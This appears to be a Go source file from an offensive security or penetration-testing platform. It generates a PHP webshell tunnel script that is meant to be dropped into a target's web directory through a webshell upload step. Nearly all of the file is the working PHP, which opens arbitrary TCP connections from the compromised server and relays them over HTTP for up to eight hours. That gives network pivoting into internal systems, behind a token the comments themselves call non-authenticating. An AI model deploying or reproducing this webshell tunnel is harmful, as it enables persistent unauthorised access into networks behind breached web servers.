package webshell

// 目标端隧道脚本：一段落地到 Web 目录的 PHP，把 HTTP 长连接拆成 TCP channel。
//
// 设计要点（为什么它能工作）：
//   - PHP 每个请求是独立的，socket 资源活不过一次请求。所以平台用「一条长连接
//     = 一个 TCP 连接」的模型：脚本在一次请求内建 socket，然后用 stream_select
//     同时盯「HTTP 输入流」和「目标 socket」，一边把平台的 DATA 帧写进 socket，
//     一边把 socket 的回显包成 DATA 帧 flush 回平台。这就是无状态的一句话马能
//     撑起任意 TCP 隧道的全部秘密。
//   - 关掉输出缓冲（ob_end_clean + implicit_flush），否则内核攒着不 flush，平台
//     的 readFrame 会一直等不到数据。
//   - ignore_user_abort(true)：客户端（平台）半关写方向时脚本不能跟着退出。
//   - 帧协议见 tunnel_frame.go；mod_php / php-fpm / 内置 server 均可跑（内置 server
//     单线程会串行处理，仅适合验证，不适合生产）。
//
// 立场：这是通道基础设施，不是免杀载荷。它落到 Web 目录后就是明文 PHP 文件，
// 与平台既有的"不生成过 WAF 的马"立场一致——测评人自己决定怎么落地和隐藏。

import "fmt"

// NewTunnelToken 生成一次隧道使用的浅校验密钥。上层流程：先调本函数拿 token →
// TunnelPHPScript(token) 生成脚本 → 经 webshell_upload 落地 → 建隧道时把同一
// token 传进 TunnelOptions.Token。token 不进任何 View/API 返回。
func NewTunnelToken() string { return randHex(12) }

// TunnelPHPScript 返回隧道脚本全文。token 是平台与脚本之间的浅校验，
// 避免同目录其他人误访问就把 socket 开出去（不是鉴权，只是防误用）。
func TunnelPHPScript(token string) string {
	return fmt.Sprintf(tunnelPHPTemplate, token)
}

// TunnelTemplateName 是载荷列表里展示的名字。
const TunnelTemplateName = "builtin/php-tunnel"

const tunnelPHPTemplate = `<?php
// WebShell SOCKS5 tunnel endpoint. One HTTP request = one TCP channel.
@set_time_limit(0);
@ignore_user_abort(true);
while (@ob_end_clean()) {}
if (function_exists('apache_setenv')) @apache_setenv('no-gzip', '1');
header('Content-Type: application/octet-stream');
header('X-Accel-Buffering: no');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
if (function_exists('implicit_flush')) @implicit_flush(true);

$T = '%s';
function wf($t, $d='') {
  echo pack('N', strlen($d)) . chr($t) . $d;
  if (function_exists('ob_flush')) @ob_flush();
  @flush();
}
function rf($s) {
  $h = fread($s, 5);
  if ($h === false || strlen($h) < 5) return null;
  $n = unpack('N', substr($h, 0, 4))[1];
  if ($n > 1048576) return null;
  $d = '';
  while (strlen($d) < $n) {
    $x = fread($s, $n - strlen($d));
    if ($x === false || $x === '') { usleep(20000); continue; }
    $d .= $x;
  }
  return array(ord($h[4]), $d);
}
$in = fopen('php://input', 'rb');

// 首个请求可以是 PING（探活），否则必须是 OPEN。
$first = rf($in);
if ($first === null) { wf(0x02, "no frame"); exit; }
if ($first[0] === 0x06) { wf(0x07); exit; } // PING -> PONG
if ($first[0] !== 0x01) { wf(0x02, "expect OPEN"); exit; }

$target = $first[1];
if ($target === '' || strpos($target, ':') === false) { wf(0x02, "bad target"); exit; }
// 浅校验 token：要求平台在 OPEN 的 target 后附加 "|token"。
$sep = strrpos($target, '|');
if ($sep === false || substr($target, $sep + 1) !== $T) { wf(0x02, "bad token"); exit; }
$target = substr($target, 0, $sep);

$sock = @stream_socket_client('tcp://' . $target, $errno, $errstr, 15);
if (!$sock) { wf(0x02, substr($errstr . ' (' . $errno . ')', 0, 4096)); exit; }
stream_set_blocking($sock, false);
wf(0x02, chr(0)); // STATUS OK

$inEOF = false;
$deadline = time() + 8 * 3600; // 平台 TTL 上限 8h，脚本兜底同值
while (time() < $deadline) {
  $read = array($sock);
  $write = null;
  $except = null;
  $n = @stream_select($read, $write, $except, 0, 200000);
  if ($n > 0) {
    $data = @fread($sock, 65536);
    if ($data !== false && $data !== '') { wf(0x03, $data); }
    if (feof($sock)) { wf(0x04); break; }
  }
  // 非阻塞读输入流：有 DATA 就写进 socket，有 EOF/CLOSE 就收尾。
  $rin = array($in); $win = null; $ein = null;
  if (@stream_select($rin, $win, $ein, 0, 0) > 0) {
    $f = rf($in);
    if ($f === null) { $inEOF = true; }
    elseif ($f[0] === 0x03) {
      $d = $f[1];
      while ($d !== '') {
        $w = @fwrite($sock, $d);
        if ($w === false || $w === 0) { break 2; }
        $d = substr($d, $w);
      }
    } elseif ($f[0] === 0x04) { // 平台半关写方向
      $inEOF = true;
      if (function_exists('stream_socket_shutdown')) @stream_socket_shutdown($sock, STREAM_SHUT_WR);
    } elseif ($f[0] === 0x05) { break; } // CLOSE
  }
  if ($inEOF && feof($sock)) break;
}
@fclose($sock);
exit;
`
